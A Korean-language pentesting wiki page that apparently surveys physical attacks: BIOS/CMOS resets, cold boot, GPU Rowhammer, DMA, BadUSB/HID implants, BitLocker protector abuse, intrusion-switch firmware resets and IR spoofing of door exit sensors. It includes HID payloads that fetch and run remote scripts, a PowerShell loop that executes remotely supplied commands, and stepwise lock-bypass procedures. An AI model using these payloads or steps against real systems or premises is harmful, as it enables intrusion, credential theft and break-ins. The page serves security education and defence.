# 물리적 공격

{{#include ../banners/hacktricks-training.md}}

## BIOS 비밀번호 복구 및 시스템 보안

레거시 PC 펌웨어 설정은 CMOS 배터리를 분리하거나 문서에 안내된 clear-CMOS 점퍼를 사용해 초기화할 수 있습니다. 필요한 전원 차단 시간은 메인보드마다 다르며, 최신 UEFI 비밀번호나 키는 비휘발성 플래시 메모리, 임베디드 컨트롤러 또는 보안 장치에 저장될 수 있으므로 배터리를 분리해도 유지될 수 있습니다. 핀을 단락시키기 전에 메인보드/서비스 설명서를 확인하세요. 이 절차로 TPM 측정값이 무효화되고 디스크 암호화 복구가 시작될 수도 있습니다.

레거시 x86 시스템에서는 **killCMOS** 및 **CmosPwd** 같은 도구를 부팅 가능한 환경에서 사용해 CMOS 기반 설정을 검사하거나 변경할 수 있습니다. CmosPwd는 문서화된 일부 구형 BIOS 제품군의 비밀번호 형식을 인식하며 CMOS 상태를 백업, 복원 또는 삭제/제거할 수 있습니다. 공개된 빌드는 레거시 DOS/Windows, Linux, FreeBSD 및 NetBSD 환경을 대상으로 합니다.<sup>[[18]](#references)</sup> 이 유틸리티는 범용 UEFI 비밀번호 제거 도구가 아니며 충분한 하드웨어/펌웨어 접근 권한이 필요합니다.

일부 노트북 펌웨어는 비밀번호를 여러 번 잘못 입력하면 제조업체별 챌린지 코드를 표시합니다. [bios-pw.org](https://bios-pw.org) 같은 데이터베이스는 일부 모델의 레거시 제조업체 복구 비밀번호를 생성할 수 있지만, 많은 시스템은 챌린지로부터 비밀번호를 생성할 수 없는 잠금 기능을 구현합니다. 생성된 비밀번호는 모델별로 다르다고 간주하고 영구 시도 횟수를 소진하지 않도록 주의하세요.

### UEFI 보안

최신 **UEFI** 시스템에서는 CHIPSEC을 사용해 Secure Boot 변수 보호를 감사할 수 있습니다. 아래의 변경 없는 검사부터 시작하세요. 선택적 `-a modify` 모드는 변수를 의도적으로 손상시키려 시도하므로 복구 가능한 실험실 시스템에서만 사용해야 합니다. CHIPSEC 자체도 권한 있는 드라이버와 저수준 하드웨어 접근은 프로덕션 엔드포인트에 적합하지 않다고 경고합니다.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM 분석 및 Cold Boot 공격

DRAM은 refresh가 중단되더라도 모든 비트를 즉시 잃지는 않습니다. 데이터 손실 속도는 모듈 기술과 온도에 따라 크게 달라지며, 냉각하면 전원을 끄지 않고 재부팅하는 경우보다 유용한 데이터를 훨씬 오래 보존할 수 있습니다. Cold-boot 공격은 빠르게 재부팅해 작은 acquisition 환경으로 진입하거나 냉각된 모듈을 옮긴 뒤, raw memory를 캡처하고 비트 손실에도 불구하고 암호화 키를 복원합니다. 디스크 복사 유틸리티가 자동으로 물리 메모리 이미징 도구가 되는 것은 아니며, Volatility는 캡처한 데이터를 분석할 뿐 획득하지 않습니다. 플랫폼에 적합하고 검증된 acquisition 도구를 사용하세요.<sup>[[12]](#references)</sup>

---

## Page Table을 겨냥한 GPU Rowhammer

최신 GPU Rowhammer 공격은 일반 버퍼 대신 **GPU virtual-memory metadata**를 겨냥할 때 훨씬 유용해집니다. **GDDR6 NVIDIA Ampere GPU**에 관한 최근 연구에 따르면, 권한이 없는 CUDA 코드를 실행하는 공격자는 GPU별 hammering 패턴을 만들고, **memory massaging**으로 paging 구조를 취약한 행에 배치한 다음 **last-level page table** 또는 중간 단계의 **page directory**에서 비트를 뒤집을 수 있습니다. translation entry 하나가 손상되면 공격자는 **임의의 GPU 메모리 읽기/쓰기**를 위한 기반을 마련한 뒤 host 침해로 이어갈 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation 패턴

1. GDDR6에서 **hammer 가능한 행을 프로파일링**하고, DRAM 내부 완화책을 우회하는 refresh 인식형/비균일 hammering 패턴을 만듭니다.
2. 드라이버가 page-translation 구조를 기본 보호 풀에 두는 대신 hammer 가능한 물리 위치에 배치하도록 **GPU 할당을 조정**합니다. 실제로는 저메모리 page-table 영역을 고갈시키고, 제어된 stride로 대규모의 희소 UVM 매핑을 뿌리는 방법을 쓸 수 있습니다.
3. page-table/page-directory entry 안의 **PFN** 또는 aperture 관련 비트 같은 **translation metadata**를 뒤집어, 공격자가 제어하는 virtual page가 page-table 페이지, 임의의 GPU 메모리 또는 host에서 볼 수 있는 시스템 매핑을 가리키게 합니다.
4. 위조한 매핑을 재사용해 추가 translation entry를 덮어쓰고, GPU context 전반에서 **임의의 GPU 메모리 읽기/쓰기**로 권한을 높입니다.

### Host로의 전환 및 완화책

- **IOMMU가 비활성화된 경우**, 위조된 system-aperture 매핑으로 GPU에서 임의의 **host physical memory**에 접근할 수 있어 GPU primitive가 완전한 host 침해로 이어집니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**는 last-level page-table entry를 겨냥하는 반면, **GeForge**는 비트 하나만 뒤집어도 더 큰 translation subtree를 다른 곳으로 향하게 할 수 있으므로 page-directory 수준을 손상하는 편이 더 쉬울 수 있음을 보여줍니다. 특정 paging 계층 하나만 보안상 중요한 것으로 취급하지 마세요.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**는 GDDRHammer/GeForge가 사용하는 host 메모리 직접 접근 경로를 차단하므로 여전히 중요하지만, **완전한 완화책은 아닙니다**. **GPUBreach**는 공격자가 GPU에서 쓸 수 있는 드라이버 소유 CPU 버퍼를 손상시킨 뒤 NVIDIA 드라이버의 memory-safety 버그를 유발해 kernel write primitive와 **root shell**을 얻는 2단계 전환을 보여줍니다. 이 공격은 IOMMU가 활성화된 경우에도 가능합니다.<sup>[[3]](#references)</sup>
- 지원되는 워크스테이션/서버 GPU에서는 **시스템 수준 ECC**가 실용적인 보안 강화책입니다. ECC가 없는 소비자용 GPU는 방어 수준이 낮습니다.<sup>[[4]](#references)</sup>
- 이러한 공격은 이론에 그치지 않습니다. **GeForge**는 RTX 3060에서 **1,171**회, RTX A6000에서 **202**회의 비트 플립을 보고했으며, 이는 동작하는 host 권한 상승 체인을 구성하기에 충분했습니다.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) 공격

사전 부팅 IOMMU 적용 수준을 낮추고 Windows DMA 공격 체인을 가능하게 할 수 있는 오프라인 UEFI IFR/NVRAM 패치 방법은 다음을 참조하세요.

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**은 FireWire 및 초기 Thunderbolt 구성과 같은 인터페이스를 통한 **DMA 기반 메모리 획득 및 패치**를 시연하며, 과거의 로그인 우회 시그니처도 포함합니다. 이 공격이 단순히 “Windows 10에서 효과가 없는 것”은 아닙니다. 악용 가능성은 인터페이스, 대상 빌드, IOMMU 정책, 잠금 상태, 그리고 Windows Kernel DMA Protection 지원 및 활성화 여부에 따라 달라집니다. Windows 10 버전 1803 이상은 호환 플랫폼에서 Kernel DMA Protection을 도입해 공격 표면을 크게 바꿨습니다.<sup>[[13]](#references)[[14]](#references)</sup>

---

## 시스템 접근을 위한 Live CD/USB

암호화되지 않았거나 이미 잠금 해제된 Windows 볼륨에서는 오프라인 환경에서 **sethc.exe** 또는 **Utilman.exe** 같은 접근성 바이너리를 **cmd.exe**로 바꿀 수 있습니다. 그러면 해당 로그인 화면 바로 가기를 실행할 때 SYSTEM 명령 프롬프트가 열립니다. **chntpw** 같은 도구는 로컬 SAM 계정 데이터를 편집할 수 있습니다. 이러한 방법은 잠긴 BitLocker 볼륨을 우회하지 못하며, DPAPI/EFS로 보호된 자격 증명을 손상시킬 수 있습니다. 포렌식 사본과 백업을 보존하세요.

**Kon-Boot**는 지원되는 Windows/macOS 구성에서 사용할 수 있는 상용 부팅 시 인증 우회 도구입니다. 호환 여부는 OS, 펌웨어 모드, Secure Boot, 디스크 암호화 설정에 따라 달라지며, BitLocker로 잠긴 볼륨을 복호화하지는 않습니다.<sup>[[10]](#references)</sup>

---

## Windows 보안 기능 처리

### 부팅 및 복구 바로 가기

- **Delete/Supr**, F2, F10 또는 다른 제조업체별 키를 누르면 펌웨어 설정을 열 수 있습니다.
- **F8**은 해당 경로가 계속 활성화된 구성에서만 기존 Windows 고급 부팅 옵션으로 진입합니다. 현재 복구 진입 방법은 구성에 따라 다릅니다.
- **Shift** 키를 누르고 있으면 일부 구성에서 Windows 자동 로그온을 막을 수 있지만, 정책/레지스트리 설정으로 이 동작을 비활성화할 수 있습니다.<sup>[[17]](#references)</sup>

### BAD USB 장치

**USB Rubber Ducky** 및 Teensy 보드 같은 장치는 신뢰된 HID 키보드로 인식되어 사전 정의된 키 입력을 주입할 수 있습니다. payload는 처음에 로그인된 세션의 권한과 데스크톱 접근 권한을 가집니다. UAC 프롬프트, 화면 잠금, 키보드 레이아웃, 타이밍, 엔드포인트 USB 정책은 여전히 payload를 제약합니다.<sup>[[15]](#references)</sup>

프로그래밍 가능한 주변 장치는 host kernel 파서도 공격할 수 있으며, 여러 USB 장치를 조율해 heap grooming 및 정보 공개를 수행할 수도 있습니다.

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Administrator 또는 backup 권한이 있으면 shadow copy를 만들거나 registry hive를 저장해 **SAM** 및 **SYSTEM** 같은 잠긴 파일을 획득할 수 있습니다. 이는 침해 이후의 수집 기법이지 권한 우회 방법이 아닙니다. `diskshadow`/VSS 이벤트 및 registry hive 내보내기 이벤트와 연관 지어 확인해야 합니다.

## BadUSB / HID Implant 기법

### NFC로 트리거하는 Android HID gadget

루팅된 Android 휴대폰은 USB 컨트롤러와 kernel이 **USB gadget/HID 지원**을 제공하는 경우에만 프로그래밍 가능한 USB 키보드가 될 수 있습니다. 호환 기기에서 Kali NetHunter는 **USB Arsenal**을 통해 gadget 프로필을 제공합니다. 다른 방법으로는 [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)이 있습니다. 이 도구는 ConfigFS gadget 기능을 만들고 `/dev/hidg0`, `/dev/hidg1` 같은 키보드/마우스 character device를 노출할 수 있습니다. 이 도구는 gadget endpoint만 만들 뿐이며, 별도의 프로세스가 여기에 HID report를 기록해야 합니다. Root 접근 권한이 있어도 ConfigFS, HID gadget 지원 또는 사용 가능한 USB Device Controller가 없는 kernel을 보완할 수는 없습니다.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

이 endpoint는 물리적 트리거로 Android NFC와 결합할 수 있습니다. [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) 앱은 태그 UID를 읽고 예상 형식으로 변환한 다음, 로컬 허용 목록과 대조합니다. 일치하면 설정된 Rubber Ducky 스타일 키보드 시퀀스를 보냅니다. 연결된 host에는 일반 키보드 입력으로 보이며 NFC 소프트웨어가 필요하지 않습니다.<sup>[[22]](#references)[[24]](#references)</sup>

바로 가기나 명령을 사용하기 전에 빈 텍스트 편집기에서 장치 인식과 키보드 레이아웃을 확인하세요. 무해한 payload는 다음과 같습니다.<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

중요한 trust boundary:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist는 식별이지 인증이 아닙니다**. UID는 공개되어 있으며, 일부 token 유형이나 emulator에서는 복제 또는 가장이 가능합니다. 허용된 UID를 복사하면 원본 token과 동일한 dispatch 경로를 따릅니다.
- **NfcScreenOff** Magisk module은 NFC service를 패치해 화면이 켜져 있고 잠금 해제된 것처럼 동작하게 합니다. 휴대폰이 이미 host에 연결되어 있다면, 휴대폰 잠금을 해제하지 않고도 payload를 실행할 수 있습니다.
- payload에 저장된 password, API token, command는 rooted 또는 bootloader가 잠금 해제된 기기에서 복구할 수 있는 비밀 정보입니다. HID로 password를 입력하는 것은 재사용 가능한 password 자동화이지, passwordless authentication이 아닙니다.
- HID injection은 활성 desktop의 권한으로 동작하며 focus, timing, host keyboard layout에 따라 달라집니다. 민감한 작업을 실행하기 전에 최근의 사용자 확인을 요구하고, script에 권한이 높은 비밀 정보를 넣지 않으며, 실제 인증에는 cryptographic challenge-response authenticator를 사용하세요.

### Wi-Fi 관리형 케이블 implant

- **Evil Crow Cable Wind**와 같은 ESP32-S3 기반 implant는 USB-A→USB-C 또는 USB-C↔USB-C 케이블 안에 숨겨져 있으며, USB keyboard로만 인식되고 Wi-Fi를 통해 C2 stack을 노출합니다. 공격자는 피해자 host에서 케이블에 전원을 공급하고, password가 `123456789`인 `Evil Crow Cable Wind`라는 이름의 hotspot을 만든 다음 [http://cable-wind.local/](http://cable-wind.local/) (또는 DHCP 주소)를 방문해 내장 HTTP interface에 접속하면 됩니다.<sup>[[8]](#references)</sup>
- browser UI에는 *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, *Config* 탭이 있습니다. 저장된 payload에는 OS별 tag가 지정되고, keyboard layout은 실행 중에 전환할 수 있으며, VID/PID 문자열을 바꿔 알려진 주변 기기를 흉내 낼 수 있습니다.
- C2가 케이블 안에 있으므로, 휴대폰을 사용해 payload를 준비하고 실행을 트리거하며 Wi-Fi credential을 관리할 수 있습니다. 이때 조직의 network를 사용할 필요가 없어, 짧은 체류 시간의 물리적 침입에 유용합니다.

### OS 인식형 AutoExec payload

- AutoExec 규칙은 USB 인식 직후 하나 이상의 payload를 실행하도록 설정합니다. implant는 가벼운 OS fingerprinting을 수행하고 일치하는 script를 선택합니다.
- 예시 workflow:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) 또는 `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- 실행이 자동으로 이루어지므로, 충전 케이블만 교체해도 로그인된 사용자 context에서 “plug-and-pwn” 초기 접근을 얻을 수 있습니다.

### Wi-Fi TCP를 통한 HID 기반 remote shell

1. **Keystroke bootstrap:** 저장된 payload가 console을 열고 새 USB serial device로 들어오는 내용을 실행하는 loop를 붙여 넣습니다. 최소한의 Windows 변형은 다음과 같습니다:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **케이블 브리지:** implant는 USB CDC 채널을 열린 상태로 유지하면서 ESP32-S3가 operator에게 TCP client(Python script, Android APK 또는 desktop executable)로 역방향 연결을 시작하도록 합니다. TCP 세션에 입력된 모든 바이트는 위의 serial loop로 전달되어 에어갭 호스트에서도 원격 명령 실행이 가능합니다. 출력은 제한적이므로 operator는 보통 블라인드 명령(계정 생성, 추가 도구 스테이징 등)을 실행합니다.

### HTTP OTA 업데이트 공격 표면

- 문서화된 Evil Crow Cable Wind 인터페이스는 `/update`에서 인증되지 않은 firmware-update endpoint를 노출합니다:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, allowing the implant to pivot to new capabilities while still plugged into the target host.

## BitLocker 암호화 우회

라이브 상태이거나 최근에 실행된 시스템을 대상으로 승인된 포렌식 획득을 수행하면, 볼륨이 잠금 해제된 동안 BitLocker 볼륨 마스터 키나 관련 키 자료가 확보될 수 있습니다. Elcomsoft Forensic Disk Decryptor 및 Passware Kit Forensic 같은 상용 도구는 지원되는 메모리 이미지, 최대 절전 모드 파일 또는 크래시 덤프에서 이를 검색할 수 있지만, 성공이 보장되지는 않습니다. 최신 Windows에서는 BitLocker가 활성화된 경우 크래시 덤프도 암호화되며, 저장된 48자리 복구 암호는 메모리에 있는 볼륨 키와는 별개의 아티팩트입니다.<sup>[[12]](#references)[[16]](#references)</sup>

---

## 복구 키 추가를 위한 Social Engineering

공격자가 관리자를 설득해 BitLocker 관리 명령을 실행하게 하면 복구 암호, 외부 키 또는 다른 protector를 추가한 뒤 이를 획득할 수 있습니다. 복구 암호는 임의의 0 문자열로 설정할 수 없습니다. BitLocker 숫자 복구 암호는 검증된 48자리 형식을 따라야 합니다. 관련된 승인된 관리 명령 구문은 `manage-bde -protectors -add C: -recoverypassword`입니다. 추가된 protector를 확인하려면 `manage-bde -protectors -get C:`를 실행합니다. Protector 추가를 모니터링하고, 새 복구 자료가 승인된 위치에만 에스크로되도록 하세요.<sup>[[16]](#references)</sup>

---

## 섀시 침입/유지보수 스위치를 악용해 BIOS를 공장 초기화하기

최신 노트북과 소형 데스크톱에는 Embedded Controller (EC)와 BIOS/UEFI 펌웨어가 모니터링하는 **섀시 침입 스위치**가 내장된 경우가 많습니다. 스위치의 주된 목적은 장치가 열렸을 때 경고를 발생시키는 것이지만, 일부 제조업체는 특정 패턴으로 스위치를 전환할 때 작동하는 **문서화되지 않은 복구 바로 가기**를 구현하기도 합니다.<sup>[[5]](#references)[[6]](#references)</sup>

### 공격 작동 방식

1. 스위치가 EC의 **GPIO 인터럽트**에 연결됩니다.
2. EC에서 실행되는 펌웨어가 **누른 횟수와 타이밍**을 추적합니다.
3. 하드코딩된 패턴이 인식되면 EC가 *mainboard-reset* 루틴을 실행해 **시스템 NVRAM/CMOS의 내용을 지웁니다**.
4. 다음 부팅 시 영향을 받은 모델은 초기화된 펌웨어 상태를 불러옵니다. 제조업체와 리비전에 따라 지워지는 상태에는 supervisor 암호, 사용자 지정 부팅 설정 또는 등록된 Secure Boot 키가 포함될 수 있습니다. TPM 상태와 디스크 암호화에 미치는 영향은 별도로 평가해야 합니다.

> 펌웨어 초기화로 외부 부팅 옵션이 복원될 수는 있지만, **저장 장치의 암호가 해제되는 것은 아닙니다**. TPM/펌웨어 변경 후 BitLocker나 다른 전체 디스크 암호화 시스템이 복구 모드로 진입할 수 있지만, 복구 키가 없으면 내부 드라이브는 계속 보호됩니다.<sup>[[16]](#references)</sup>

### 실제 사례 – Framework 13 노트북

Framework 13(11/12/13세대)의 복구 바로 가기는 다음과 같습니다.

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

열 번째 주기 이후 EC는 다음 재부팅 때 BIOS가 NVRAM을 지우도록 지시하는 플래그를 설정합니다. 전체 절차는 약 40초가 걸리며 **드라이버 하나만 있으면 됩니다**.<sup>[[5]](#references)</sup>

### 일반적인 Exploitation 절차

1. EC가 실행 중이도록 대상을 켜거나 절전 모드에서 복귀시킵니다.
2. 하단 덮개를 분리해 침입/유지보수 스위치를 노출시킵니다.
3. 제조사별 토글 패턴을 재현합니다(문서나 포럼을 확인하거나 EC 펌웨어를 리버스 엔지니어링합니다).
4. 다시 조립한 뒤 재부팅하고 실제로 변경된 펌웨어 설정과 자격 증명을 확인합니다.
5. 권한이 있고 외부 부팅이 가능하다면, 통제된 라이브 이미지를 부팅합니다. 내부 볼륨을 정당한 절차로 잠금 해제한 경우(또는 애초에 암호화되지 않은 경우) 라이브 환경에서 자격 증명과 데이터를 확보하거나 EFI System Partition을 검사할 수 있습니다. 해당 파티션을 수정해 EFI implant를 설치하는 행위는 지속성이 있고 매우 침해적이며, Secure Boot, measured boot, 펌웨어 쓰기 방지 및 엔드포인트 모니터링의 제약을 받습니다. 암호화된 저장 장치는 키나 복구 자료 없이는 접근할 수 없습니다.

### 탐지 및 완화

* OS 관리 콘솔에 섀시 침입 이벤트를 기록하고 예상치 못한 BIOS 초기화와 연관 지어 분석합니다.
* 나사/덮개에 **변조 확인용 봉인**을 사용해 개봉 여부를 감지합니다.
* 기기를 **물리적으로 통제되는 구역**에 보관합니다. 물리적 접근은 전체 침해와 같다고 가정합니다.
* 가능한 경우 제조사의 “maintenance switch reset” 기능을 비활성화하거나, NVRAM 초기화에 추가적인 암호화 인증을 요구합니다.

---

## 비접촉식 출구 센서를 겨냥한 은밀한 IR 주입

### 센서 특성
- 일반적인 “wave-to-exit” 센서는 근적외선 LED emitter와 TV 리모컨 방식의 receiver 모듈을 조합합니다. receiver 모듈은 올바른 반송파(약 30 kHz)의 펄스를 여러 번(약 4~10회) 감지한 뒤에만 logic high를 출력합니다.<sup>[[7]](#references)</sup>
- 플라스틱 덮개는 emitter와 receiver가 서로를 직접 바라보지 못하게 차단하므로, 컨트롤러는 검증된 반송파가 근처에서 반사되어 온 것이라고 간주하고 도어 스트라이크를 여는 릴레이를 작동시킵니다.
- 컨트롤러가 대상이 있다고 판단하면 송신 변조 엔벨로프를 변경하는 경우가 많지만, receiver는 필터링된 반송파와 일치하는 버스트를 계속 받아들입니다.

### 공격 절차
1. **방출 프로파일 캡처** – 로직 분석기를 컨트롤러 핀에 연결해 내부 IR LED를 구동하는 감지 전후의 파형을 모두 기록합니다.
2. **“감지 후” 파형만 재생** – 기본 emitter를 제거하거나 무시하고, 이미 트리거된 패턴으로 외부 IR LED를 처음부터 구동합니다. receiver는 펄스 수/주파수만 확인하므로 위조된 반송파를 진짜 반사 신호로 간주하고 릴레이 라인을 활성화합니다.
3. **송신 타이밍 제어** – receiver의 AGC나 간섭 처리 로직을 포화시키지 않으면서 필요한 최소 펄스 수를 전달하도록 조정된 버스트(예: 수십 밀리초 켜짐, 비슷한 길이로 꺼짐)로 반송파를 송신합니다. 계속 송신하면 센서의 감도가 빠르게 떨어져 릴레이가 작동하지 않습니다.

### 장거리 반사 주입
- 실험용 LED를 고출력 IR 다이오드, MOSFET driver 및 집광 광학 장치로 교체하면 약 6 m 거리에서도 안정적으로 트리거할 수 있습니다.
- 공격자는 receiver aperture를 직접 바라볼 필요가 없습니다. 유리 너머로 보이는 실내 벽, 선반 또는 문틀에 빔을 조준하면 반사된 에너지가 약 30°의 시야각으로 들어와 가까운 거리에서 손을 흔든 것처럼 보입니다.
- receiver는 약한 반사만을 예상하므로, 훨씬 강한 외부 빔은 여러 표면에서 반사된 뒤에도 감지 임계값을 넘을 수 있습니다.

### 무기화된 공격용 손전등
- 상용 손전등 내부에 driver를 넣으면 도구를 눈에 잘 띄지 않게 숨길 수 있습니다. 가시광 LED를 receiver 대역에 맞춘 고출력 IR LED로 교체하고, ATtiny412(또는 유사한 부품)를 추가해 약 30 kHz 버스트를 생성한 다음, MOSFET으로 LED 전류를 흘려 보냅니다.
- 망원 줌 렌즈는 빔을 좁혀 사거리와 정밀도를 높이며, MCU 제어 진동 모터는 가시광을 방출하지 않고 변조가 작동 중임을 촉각으로 알려줍니다.
- 저장된 여러 변조 패턴(반송파 주파수와 엔벨로프를 조금씩 다르게 설정)을 순환하면 브랜드가 바뀐 센서 계열에서도 호환성이 높아집니다. 릴레이가 딸깍 소리를 내고 문이 열릴 때까지 반사면을 차례로 겨냥할 수 있습니다.

---

## References

- [1] [GDDRHammer: DRAM 행을 크게 교란하기 — 최신 GPU의 컴포넌트 간 Rowhammer 공격](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR 메모리를 해머링해 GPU 페이지 테이블을 위조하기: 재미와 수익을 위해](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer를 이용한 GPU 권한 상승 공격](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - 보안 공지: Rowhammer - 2025년 7월](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. 여기를 누르면 pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – 메인보드 초기화 가이드](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “손대지 마세요! – 은밀한 IR 손전등으로 IR 비접촉식 출구 센서 우회하기”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “연결하고, 실행하고, pwn하기: Evil Crow Cable Wind를 이용한 해킹”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA 칩을 겨냥한 Rowhammer 공격](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot 공식 문서 및 호환성 정보](https://kon-boot.com/)
- [11] [CHIPSEC 문서 - Secure Boot 변수 보호](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [기억하지 않도록: 암호화 키에 대한 Cold Boot 공격](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA를 통한 물리 메모리 조작](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky 문서](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker 작업 가이드](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift 키를 누른 상태에서의 자동 로그온 동작](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd 문서 및 다운로드](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux 문서 - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux 커널 문서 - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [루팅된 Android 휴대전화를 PC용 NFC 인증기 및 자동화 도구로 바꾸기](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
